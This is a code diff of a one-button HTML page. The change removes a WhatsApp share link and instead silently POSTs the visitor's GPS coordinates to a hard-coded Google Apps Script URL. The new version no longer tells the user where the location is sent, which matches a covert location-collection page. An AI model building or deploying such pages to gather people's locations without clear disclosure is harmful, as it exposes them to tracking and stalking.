@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Send My Location</title>
+  <title>Send Location</title>
 </head>
 <body>
-  <h2>Click below to send your location on WhatsApp:</h2>
+  <h2>Click to send your location</h2>
   <button onclick="sendLocation()">Send My Location</button>
   <p id="status"></p>
 
@@ -12,7 +12,7 @@
     function sendLocation() {
       const status = document.getElementById("status");
       if (!navigator.geolocation) {
-        status.textContent = "Geolocation is not supported by your browser.";
+        status.textContent = "Geolocation not supported.";
         return;
       }
 
@@ -22,29 +22,26 @@
         (position) => {
           const lat = position.coords.latitude;
           const lng = position.coords.longitude;
-          const message = `My location is:\nLatitude: ${lat}\nLongitude: ${lng}`;
-          const waURL = `https://wa.me/?text=${encodeURIComponent(message)}`;
-          window.location.href = waURL;
+          
+          // Replace this URL with your Google Apps Script web app URL
+          const scriptURL = "https://script.google.com/macros/s/AKfycby3RTVDuB3kLOJXQUC4g6EwcE2vGA65kqWh_K-EjeLUDIPB_YgUbjRkBv5X7Lyp-j7Y/exec";
+          
+          fetch(`${scriptURL}?lat=${lat}&lng=${lng}`, {
+            method: "POST"
+          })
+          .then(res => {
+            status.textContent = "Location sent successfully!";
+          })
+          .catch(err => {
+            status.textContent = "Failed to send location.";
+          });
         },
         (error) => {
-          switch(error.code) {
-            case error.PERMISSION_DENIED:
-              status.textContent = "Permission denied. Please allow location access.";
-              break;
-            case error.POSITION_UNAVAILABLE:
-              status.textContent = "Location information is unavailable.";
-              break;
-            case error.TIMEOUT:
-              status.textContent = "Location request timed out.";
-              break;
-            default:
-              status.textContent = "An unknown error occurred.";
-              break;
-          }
+          status.textContent = "Unable to access location.";
         }
       );
     }
   </script>
 </body>
 </html>
-
+  
